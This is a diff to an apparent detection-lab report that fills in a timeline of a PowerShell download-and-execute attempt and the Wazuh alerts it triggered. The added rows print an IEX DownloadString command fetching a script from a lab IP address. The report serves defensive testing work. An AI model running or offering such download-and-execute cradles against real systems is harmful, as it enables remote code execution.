@@ -27,12 +27,10 @@ PowerShell Script Block Logging (Event ID 4104) recorded the full command text r
 
 | Time | Source | Event |
 |------|--------|-------|
-| `<time>` | Target (interactive PowerShell) | `IEX (New-Object Net.WebClient).DownloadString(...)` run directly; fails with WebException |
-| `<time>` | Target | Event 4104 logs the script block for the direct `IEX` call |
-| `<time>` | Target | Same command run again via `powershell.exe -Command "..."` |
-| `<time>` | Target | Event 4104 logs the script block for the `-Command` variant |
-| `<time>` | Wazuh | Rule 91837 fires on the logged script block (level 4) |
-| `<time>` | Wazuh | Rule 100002 fires on the same script block (level 12) |
+| 19:02:13 | Target (interactive PowerShell) | `powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.230.129/test.ps1')"` run; fails with WebException |
+| 19:02:13.964 | Wazuh | Rule 100002 fires on this script block — 1st alert |
+| 19:02:14 | Target (interactive PowerShell) | Direct `IEX (New-Object Net.WebClient).DownloadString(...)` run; fails with WebException |
+| 19:02:15.017 | Wazuh | Rule 100002 fires on this script block — 2nd alert |
 
 ## 3. TTP (MITRE ATT&CK)
 
